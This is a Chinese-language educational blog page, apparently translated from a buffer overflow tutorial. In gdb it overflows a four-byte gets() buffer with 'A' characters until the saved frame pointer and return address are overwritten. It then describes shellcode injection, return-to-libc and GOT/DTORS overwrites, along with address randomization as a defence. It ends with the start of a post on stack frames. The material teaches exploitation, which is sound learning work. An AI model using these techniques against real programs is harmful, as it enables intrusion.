<h1 id="BUFFER-OVERFLOW-PROGRAM-EXECUTIONS"><a href="#BUFFER-OVERFLOW-PROGRAM-EXECUTIONS" class="headerlink" title="BUFFER OVERFLOW PROGRAM EXECUTIONS"></a><strong>BUFFER OVERFLOW PROGRAM EXECUTIONS</strong></h1><p>接着我们通过输入3，5，8和12个字符来运行代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[bodo@bakawali testbed5]$ ./testbuff</span><br><span class="line">Some input: AAA</span><br><span class="line">AAA</span><br><span class="line">[bodo@bakawali testbed5]$ ./testbuff</span><br><span class="line">Some input: AAAAA</span><br><span class="line">AAAAA</span><br><span class="line">Segmentation fault</span><br><span class="line">[bodo@bakawali testbed5]$ ./testbuff</span><br><span class="line">Some input: AAAAAAAA</span><br><span class="line">AAAAAAAA</span><br><span class="line">Segmentation fault</span><br><span class="line">[bodo@bakawali testbed5]$ ./testbuff</span><br><span class="line">Some input: AAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAA</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>

<p>显然，输入3个字符就可以了，但是超过3个字符（这里是5、8和12个字符）会产生分段错误，程序终止以避免其他不良后果。 好吧，有两个函数使用 buff 缓冲区。 那么，哪个函数的缓冲区（gets() 或 puts()）会产生分段错误或者哪个函数已经溢出？ 留给你去寻找答案。</p>
<h1 id="DEBUGGING-THE-BUFFER-OVERFLOW-PROGRAM"><a href="#DEBUGGING-THE-BUFFER-OVERFLOW-PROGRAM" class="headerlink" title="DEBUGGING THE BUFFER OVERFLOW PROGRAM"></a>DEBUGGING THE BUFFER OVERFLOW PROGRAM</h1><p> 让我们使用 gdb 调试程序，看看这里到底发生了什么</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">[bodo@bakawali testbed5]$ gdb testbuff</span><br><span class="line"></span><br><span class="line">GNU gdb Red Hat Linux (6.1post-1.20040607.43rh)</span><br><span class="line"></span><br><span class="line">Copyright 2004 Free Software Foundation, Inc.</span><br><span class="line"></span><br><span class="line">GDB is free software, covered by the GNU General Public License, and you are</span><br><span class="line"></span><br><span class="line">welcome to change it and/or distribute copies of it under certain conditions.</span><br><span class="line"></span><br><span class="line">Type &quot;show copying&quot; to see the conditions.</span><br><span class="line"></span><br><span class="line">There is absolutely no warranty for GDB.  Type &quot;show warranty&quot; for details.</span><br><span class="line"></span><br><span class="line">This GDB was configured as &quot;i386-redhat-linux-gnu&quot;...Using host libthread_db library &quot;/lib/tls/libthread_db.so.1&quot;.</span><br><span class="line"></span><br><span class="line">(gdb) break main</span><br><span class="line">Breakpoint 1 at 0x8048422: file testbuff.c, line 14.</span><br><span class="line">(gdb) disass main</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line"></span><br><span class="line">0x08048406 &lt;main+0&gt;:    push   %ebp</span><br><span class="line"></span><br><span class="line">0x08048407 &lt;main+1&gt;:    mov    %esp, %ebp</span><br><span class="line"></span><br><span class="line">0x08048409 &lt;main+3&gt;:    sub    $0x8, %esp</span><br><span class="line"></span><br><span class="line">0x0804840c &lt;main+6&gt;:    and    $0xfffffff0, %esp</span><br><span class="line"></span><br><span class="line">0x0804840f &lt;main+9&gt;:    mov    $0x0, %eax</span><br><span class="line"></span><br><span class="line">0x08048414 &lt;main+14&gt;:   add    $0xf, %eax</span><br><span class="line"></span><br><span class="line">0x08048417 &lt;main+17&gt;:   add    $0xf, %eax</span><br><span class="line"></span><br><span class="line">0x0804841a &lt;main+20&gt;:   shr    $0x4, %eax</span><br><span class="line"></span><br><span class="line">0x0804841d &lt;main+23&gt;:   shl    $0x4, %eax</span><br><span class="line"></span><br><span class="line">0x08048420 &lt;main+26&gt;:   sub    %eax, %esp</span><br><span class="line"></span><br><span class="line">0x08048422 &lt;main+28&gt;:   call  0x80483d0 &lt;Test&gt;</span><br><span class="line"></span><br><span class="line">0x08048427 &lt;main+33&gt;:   mov    $0x0, %eax</span><br><span class="line"></span><br><span class="line">0x0804842c &lt;main+38&gt;:   leave</span><br><span class="line"></span><br><span class="line">0x0804842d &lt;main+39&gt;:   ret</span><br><span class="line"></span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">(gdb) disass Test</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function Test:</span><br><span class="line"></span><br><span class="line">0x080483d0 &lt;Test+0&gt;:    push   %ebp</span><br><span class="line"></span><br><span class="line">0x080483d1 &lt;Test+1&gt;:    mov    %esp, %ebp</span><br><span class="line"></span><br><span class="line">0x080483d3 &lt;Test+3&gt;:    sub    $0x8, %esp</span><br><span class="line"></span><br><span class="line">0x080483d6 &lt;Test+6&gt;:    sub    $0xc, %esp</span><br><span class="line"></span><br><span class="line">0x080483d9 &lt;Test+9&gt;:    push   $0x8048510</span><br><span class="line"></span><br><span class="line">0x080483de &lt;Test+14&gt;:   call   0x8048318 &lt;_init+88&gt;</span><br><span class="line"></span><br><span class="line">0x080483e3 &lt;Test+19&gt;:   add    $0x10, %esp            ;_init stack clean up</span><br><span class="line"></span><br><span class="line">0x080483e6 &lt;Test+22&gt;:   sub    $0xc, %esp</span><br><span class="line"></span><br><span class="line">0x080483e9 &lt;Test+25&gt;:   lea    0xfffffffc(%ebp), %eax  ;load effective address pointer [ebp-4] into eax</span><br><span class="line"></span><br><span class="line">0x080483ec &lt;Test+28&gt;:   push   %eax                   ;push the pointer onto the stack</span><br><span class="line"></span><br><span class="line">0x080483ed &lt;Test+29&gt;:   call   0x80482e8 &lt;_init+40&gt;</span><br><span class="line">0x080483f2 &lt;Test+34&gt;:   add    $0x10, %esp            ;_init stack clean up</span><br><span class="line"></span><br><span class="line">0x080483f5 &lt;Test+37&gt;:   sub    $0xc, %esp</span><br><span class="line"></span><br><span class="line">0x080483f8 &lt;Test+40&gt;:   lea    0xfffffffc(%ebp), %eax</span><br><span class="line"></span><br><span class="line">0x080483fb &lt;Test+43&gt;:   push   %eax</span><br><span class="line"></span><br><span class="line">0x080483fc &lt;Test+44&gt;:   call   0x80482f8 &lt;_init+56&gt;</span><br><span class="line"></span><br><span class="line">0x08048401 &lt;Test+49&gt;:   add    $0x10, %esp            ;_init stack clean up</span><br><span class="line"></span><br><span class="line">0x08048404 &lt;Test+52&gt;:   leave</span><br><span class="line"></span><br><span class="line">0x08048405 &lt;Test+53&gt;:   ret</span><br><span class="line"></span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>通过反汇编程序，虽然我们只声明了一个有4个元素（4个字节）的数组，但可以看到已经为局部变量和Test()函数的缓冲区分配了20个字节（0x8 + 0xc）。 让我们深入挖掘</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[bodo@bakawali testbed5]$ gdb -q testbuff</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/tls/libthread_db.so.1&quot;</span>.</span><br><span class="line">(gdb) <span class="built_in">break</span> main</span><br><span class="line">Breakpoint 1 at 0x8048422: file testbuff.c, line 14.</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /home/bodo/testbed5/testbuff</span><br><span class="line">Breakpoint 1, main (argc=1, argv=0xbfea3064) at testbuff.c:14</span><br><span class="line">14      Test();</span><br><span class="line">(gdb) s</span><br><span class="line">Test () at testbuff.c:7</span><br><span class="line">7       <span class="built_in">printf</span>(<span class="string">&quot;Some input: &quot;</span>);</span><br><span class="line">(gdb)</span><br><span class="line">8       gets(buff);</span><br><span class="line">(gdb)</span><br><span class="line">Some input: AAA</span><br><span class="line">9       puts(buff);</span><br><span class="line">(gdb) x/x <span class="variable">$esp</span></span><br><span class="line">0xbfea2fb0:     0x00000000</span><br><span class="line">(gdb) x/x <span class="variable">$ebp</span></span><br><span class="line">0xbfea2fb8:     0xbfea2fd8</span><br><span class="line">(gdb) x/x <span class="variable">$ebp</span>-4</span><br><span class="line">0xbfea2fb4:     0x00414141</span><br><span class="line">(gdb) x/s 0xbfea2fb4</span><br><span class="line">0xbfea2fb4:      <span class="string">&quot;AAA&quot;</span></span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>

<p>该程序的堆栈框架图如下所示。 buff[4] 存储在 Test() 函数堆栈帧的局部变量缓冲区中。 请记住，我们这里没有函数的参数。 字符“A”的十六进制为 41（红色标记）。</p>
<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow4_files/image001.png" alt="Stack construction during the function call"></p>
<p>如果输入的是“AAA”的三个字符，则buff[4]数组正确填充三个字符+NULL。</p>
<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow4_files/image002.png" alt="Filling up the buffer in the stack"></p>
<p>这里的 ebp+4 即 call 指令的下一条指令的位置，即<code>08048427</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x08048422 &lt;main+28&gt;:   call  0x80483d0 &lt;Test&gt;</span><br><span class="line"></span><br><span class="line">0x08048427 &lt;main+33&gt;:   mov    $0x0, %eax</span><br></pre></td></tr></table></figure>

<p>当我们输入五个字符“AAAAA”时，保存的 %ebp 的某些区域将被覆盖，如下所示，使保存的保存 main() 堆栈帧指针的 %ebp 不再有效。 稍后恢复此堆栈帧指针时，它将指向错误或未定义的堆栈帧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">(gdb) r</span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">Starting program: /home/bodo/testbed5/testbuff</span><br><span class="line"></span><br><span class="line">Breakpoint 1, main (argc=1, argv=0xbff2d6a4) at testbuff.c:14</span><br><span class="line">14      Test();</span><br><span class="line">(gdb) s</span><br><span class="line">Test () at testbuff.c:7</span><br><span class="line">7       printf(&quot;Some input: &quot;);</span><br><span class="line">(gdb)</span><br><span class="line">8       gets(buff);</span><br><span class="line">(gdb)</span><br><span class="line">Some input: AAAAA</span><br><span class="line">9       puts(buff);</span><br><span class="line">(gdb) x/x $ebp</span><br><span class="line">0xbff2d5f8:     0xbff20041</span><br><span class="line">(gdb) x/x $ebp-4</span><br><span class="line">0xbff2d5f4:     0x41414141</span><br><span class="line">(gdb) x/x $ebp-8</span><br><span class="line">0xbff2d5f0:     0x00000000</span><br><span class="line">(gdb) x/s 0xbff2d5f8</span><br><span class="line">0xbff2d5f8:      &quot;A&quot;</span><br><span class="line">(gdb) x/s 0xbff2d5f4</span><br><span class="line">0xbff2d5f4:      &quot;AAAAA&quot;</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>

<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow4_files/image003.png" alt="Some portion of the buffer around the ebp has been overwritten"></p>
<p>我们输入更多数据，8个字符：AAAAAAAAA</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">(gdb) r</span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">Starting program: /home/bodo/testbed5/testbuff</span><br><span class="line">Breakpoint 1, main (argc=1, argv=0xbfed9484) at testbuff.c:14</span><br><span class="line">14      Test();</span><br><span class="line">(gdb) s</span><br><span class="line">Test () at testbuff.c:7</span><br><span class="line">7       printf(&quot;Some input: &quot;);</span><br><span class="line">(gdb)</span><br><span class="line">8       gets(buff);</span><br><span class="line">(gdb)</span><br><span class="line">Some input: AAAAAAAA</span><br><span class="line">9       puts(buff);</span><br><span class="line">(gdb) x/x $ebp</span><br><span class="line">0xbfed93d8:     0x41414141</span><br><span class="line">(gdb) x/x $ebp-4</span><br><span class="line">0xbfed93d4:     0x41414141</span><br><span class="line">(gdb) x/x $ebp-8</span><br><span class="line">0xbfed93d0:     0x00000000</span><br><span class="line">(gdb) x/x $ebp+4</span><br><span class="line">0xbfed93dc:     0x08048400</span><br><span class="line">(gdb) x/s 0xbfed93d8</span><br><span class="line">0xbfed93d8:      &quot;AAAA&quot;</span><br><span class="line">(gdb) x/s 0xbfed93d4</span><br><span class="line">0xbfed93d4:      &quot;AAAAAAAA&quot;</span><br><span class="line">(gdb) x/x $esp</span><br><span class="line">0xbfed93d0:     0x00000000</span><br><span class="line">(gdb) x/x $esp+4</span><br><span class="line">0xbfed93d4:     0x41414141</span><br><span class="line">(gdb) x/x $esp+8</span><br><span class="line">0xbfed93d8:     0x41414141</span><br><span class="line">(gdb) x/x $esp+12</span><br><span class="line">0xbfed93dc:     0x08048400</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>

<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow4_files/image004.png" alt="More buffer area has been overwritten with &#39;A&#39;"></p>
<p>输入 8 个字符后，我们用 0x41414141 和部分返回地址完全覆盖了 ebp（保存的帧指针）。 从gdb：</p>
<p>​	原来保存的 %ebp &#x3D;0xbfea2fd8</p>
<p>​	被覆盖的 %ebp &#x3D;0x41414141</p>
<p>​	原始返回地址 &#x3D; 0x08048427</p>
<p>​	被覆盖的返回地址 &#x3D; 0x08048400</p>
<p>接下来，输入更多数据，12 个字符：AAAAAAAAAAAA。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">(gdb) r</span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">Starting program: /home/bodo/testbed5/testbuff</span><br><span class="line">Breakpoint 1, main (argc=1, argv=0xbff43764) at testbuff.c:14</span><br><span class="line">14      Test();</span><br><span class="line">(gdb) s</span><br><span class="line">Test () at testbuff.c:7</span><br><span class="line">7       printf(&quot;Some input: &quot;);</span><br><span class="line">(gdb)</span><br><span class="line">8       gets(buff);</span><br><span class="line">(gdb)</span><br><span class="line">Some input: AAAAAAAAAAAA</span><br><span class="line">9       puts(buff);</span><br><span class="line">(gdb) x/x $ebp</span><br><span class="line">0xbff436b8:     0x41414141</span><br><span class="line">(gdb) x/x $ebp-4</span><br><span class="line">0xbff436b4:     0x41414141</span><br><span class="line">(gdb) x/x $ebp-8</span><br><span class="line">0xbff436b0:     0x00000000</span><br><span class="line">(gdb) x/x $ebp+4</span><br><span class="line">0xbff436bc:     0x41414141</span><br><span class="line">(gdb) x/x $ebp+8</span><br><span class="line">0xbff436c0:     0x00000000</span><br><span class="line">(gdb) x/x 0xbff436b8</span><br><span class="line">0xbff436b8:     0x41414141</span><br><span class="line">(gdb) x/s 0xbff436b8</span><br><span class="line">0xbff436b8:      &quot;AAAAAAAA&quot;</span><br><span class="line">(gdb) x/s 0xbff436b4</span><br><span class="line">0xbff436b4:      &#x27;A&#x27; &lt;repeats 12 times&gt;</span><br><span class="line">(gdb) x/s 0xbff436bc</span><br><span class="line">0xbff436bc:      &quot;AAAA&quot;</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>

<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow4_files/image005.png" alt="img"></p>
<p>好吧，当我们输入更多数据时，在这里输了“AAAAAAAAAAAA”，12 个“A”字符（12 个字节）； 函数的返回地址也会被覆盖！ 当此返回地址恢复（从堆栈中弹出并加载到 %eip 中）时，执行流程将在无效地址 0x41414141 处继续，从而产生分段错误。 保存的 %ebp 和函数的返回地址已损坏。 在真正的漏洞利用中，返回地址将被攻击者想要的有意义的地址覆盖，例如指向已经存储有恶意代码的堆栈区域或系统库或系统中可用的其他易受攻击的应用程序&#x2F;程序。</p>
<p>在这个例子中，我们测试了我们的程序，只使用了一个包含四个元素的数组，这些元素刚刚填充了堆栈帧的局部变量区域，然后我们成功地覆盖了函数的返回地址。 那么，我们要在哪里存储我们的漏洞利用代码？ 具体到这个例子，当使用5或6个元素的数组进行测试时，通过反汇编程序，生成分段错误所需的输入是24个字符（23 + NULL）。 在这种情况下，函数堆栈帧中的缓冲区与局部变量区一起用于临时存储的 get() 和 puts() 操作。 这为我们提供了一个注入漏洞利用代码的区域。 堆栈帧的布局假设如下所示：</p>
<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow4_files/image006.png" alt="The layout of the stack frame for injecting malicious codes"></p>
<p>这里的思路是，如果我们想做简单的exploit，可以从Buffer区开始填到Local变量，保存的%ebp和函数返回地址。</p>
<p>典型的基本缓冲区溢出漏洞利用将尝试用指向恶意代码已注入缓冲区的地址覆盖返回地址，如下所示。</p>
<p>代码注入之前：</p>
<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow4_files/image007.png" alt="img"></p>
<p>注入之后：</p>
<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow4_files/image008.png" alt="img"></p>
<p>典型的利用漏洞利用方法将恶意代码注入堆栈的同一程序缓冲区，从而溢出堆栈缓冲区的典型布局如下所示。</p>
<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow4_files/image009.png" alt="img"></p>
<p>作为结论，缓冲区溢出攻击的一般形式实际上试图实现以下两个目标：</p>
<p>​	1.注入攻击代码（在程序中对输入进行硬编码，来自命令行或网络字符串的用户输入&#x2F;通过套接字的输入重定向——远程攻击或其他高级方法）。</p>
<p>​	2.改变运行进程的执行路径来执行攻击代码（通过覆盖返回地址）。</p>
<p>需要注意的是，这两个目标是相互依赖的。 通过注入没有执行能力的攻击代码不一定是漏洞。</p>
<h1 id="THE-STACK-BASED-BUFFER-OVERFLOW-EXPLOIT-VARIANT"><a href="#THE-STACK-BASED-BUFFER-OVERFLOW-EXPLOIT-VARIANT" class="headerlink" title="THE STACK BASED BUFFER OVERFLOW EXPLOIT VARIANT"></a>THE STACK BASED BUFFER OVERFLOW EXPLOIT VARIANT</h1><p>在了解基于堆栈的缓冲区溢出操作的基本原理后，让我们研究用于漏洞利用的变体。</p>
<p>第一种情况如前面的示例中所述。 此漏洞利用通常使用具有缓冲区溢出漏洞的应用程序&#x2F;程序。 漏洞利用可以欺骗函数或子例程将比可用空间更多的数据放入其缓冲区。 多余的数据将存储在固定大小的缓冲区（已通过数组等在程序中声明）之外，包括存储返回地址的内存位置。 通过覆盖返回地址，该地址保存了函数任务完成时要执行的代码的内存位置的地址，漏洞利用程序可以控制子程序完成时要执行的代码。 这种类型的缓冲区溢出漏洞已通过多种方式受到保护。</p>
<p>利用缓冲区溢出的第二种情况只是覆盖函数的返回地址。 然而，它不是用缓冲区中的代码地址覆盖它，而是用一个函数或其他对象的地址覆盖它，这些对象已经存在于正在运行的应用程序中，例如具有缓冲区溢出漏洞的共享 glibc 库。 以前，在实施任何缓冲区溢出保护之前，这些函数已经加载到系统固定地址的内存中。 这种类型的攻击不依赖于在堆栈区域上执行代码，而是依赖于执行现有的合法代码。 此漏洞通常与其他类型的漏洞结合使用，例如作为恶意输入的格式字符串和 Unicode</p>
<p>与基本堆栈溢出一样，攻击者必须知道堆栈上缓冲区的大致地址，实际上很容易获得。 例如，每个运行完全相似版本的 Linux OS 的系统基本上都有相似的应用程序、二进制文件和库。 由于这些相似性，许多操作系统的抢手地址非常相似或相同。 编写漏洞利用程序的人只需检查自己的系统，以确定与所有其他此类系统相似的地址。 例如，这对于 Red Hat Linux 来说并不是唯一的。 这种类型的漏洞利用也受到多种方式的保护。</p>
<p>Windows 操作系统也有同样的问题，但每个版本的 Windows 操作系统（如 Windows 2000 Server 和 Windows Xp Pro 版本）对应用程序中存在的功能都有不同的地址。 这些函数通常是 Win32 函数。 请记住，相同版本的 Windows 操作系统但具有不同的 Service Pack (SP) 或补丁程序，这些函数和库的位置也可能不同。 虽然每个版本的 Windows 操作系统都有不同的 Win32 函数地址，但幸运的是，这些地址可以在标准的 Windows 操作系统文档中找到，也可以通过使用第三方程序如 PE 浏览器（<a target="_blank" rel="noopener" href="http://www.smidgeonsoft.prohosting.com/">http://www.smidgeonsoft.prohosting.com/</a> ) 实用程序，适用于相应的 Windows 操作系统版本。</p>
<p>此漏洞利用的一个示例是 return-to-libc。 它是一种计算机安全攻击，通常以缓冲区溢出开始，其中堆栈上的返回地址被程序中共享库的另一个函数（例如 printf() 家族（使用格式字符串漏洞）的地址）替换。 这允许攻击者在不向程序中注入恶意代码的情况下调用现有的易受攻击的函数，并且仍然可能成为受<strong>non-executable stack</strong>等概念保护的环境中的安全漏洞。</p>
<p>对于高级和更新的漏洞利用，他们曾经覆盖其他地址，例如：</p>
<ol>
<li><p>函数指针。</p>
</li>
<li><p>程序 ELF 的 GOT 指针 (.got)。</p>
</li>
<li><p>程序 ELF 的 DTORS 部分 (.dtors)。</p>
</li>
</ol>
<p>不幸的是，对于黑客来说，这种类型的缓冲区溢出漏洞也得到了许多保护。 例如在 Red Hat Enterprise Linux v.3, update 3 中，一个补丁程序，</p>
<p>（警告：链接是一个 pdf 文档）随机分配程序的以下组件的地址：</p>
<ul>
<li>Locations of shared libraries.</li>
<li>The stack itself.</li>
<li>The start of the programs heap.</li>
</ul>
<p>因此无法再猜测地址，因此几乎不可能找到这些漏洞利用所需的确切地址； 现在每台机器的地址都不同，并且每次程序启动时都不同。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/09/BO8-%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" data-id="cl6x1oij400046mgq275d0b7n" data-title="栈缓冲区溢出" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-BO7-栈操作" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/09/BO7-%E6%A0%88%E6%93%8D%E4%BD%9C/" class="article-date">
  <time class="dt-published" datetime="2021-10-08T16:00:00.000Z" itemprop="datePublished">2021-10-09</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/09/BO7-%E6%A0%88%E6%93%8D%E4%BD%9C/">栈操作</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="The-Stack-Operation"><a href="#The-Stack-Operation" class="headerlink" title="The Stack Operation"></a>The Stack Operation</h1><h2 id="PROCESSOR’S-STACK-TRACING-THE-ACTION"><a href="#PROCESSOR’S-STACK-TRACING-THE-ACTION" class="headerlink" title="PROCESSOR’S STACK: TRACING THE ACTION"></a>PROCESSOR’S STACK: TRACING THE ACTION</h2><p>函数调用和栈可以总结如下：</p>
<ol>
<li>将参数压入栈中</li>
<li>调用函数（压入函数返回地址）</li>
<li>（内置函数）为局部变量和缓冲区存储设置栈帧</li>
<li>在函数返回之前，调整栈帧来解除局部变量和缓冲区存储的分配</li>
<li>返回（弹出返回地址）并且调整栈来移除函数参数</li>
</ol>
<p>一个C程序如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">TestFunc</span><span class="params">(<span class="type">int</span> parameter1,<span class="type">int</span> parameter2,<span class="type">char</span> parameter3)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> y = <span class="number">3</span>, z = <span class="number">4</span>;</span><br><span class="line"><span class="type">char</span> buff[<span class="number">7</span>] = <span class="string">&quot;ABCDEF&quot;</span>;</span><br><span class="line"><span class="comment">// function&#x27;s task code here</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[ ])</span></span><br><span class="line">&#123;</span><br><span class="line">TestFunc(<span class="number">1</span>, <span class="number">2</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先进行编译</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o testprog5 testprog5.c</span><br></pre></td></tr></table></figure>

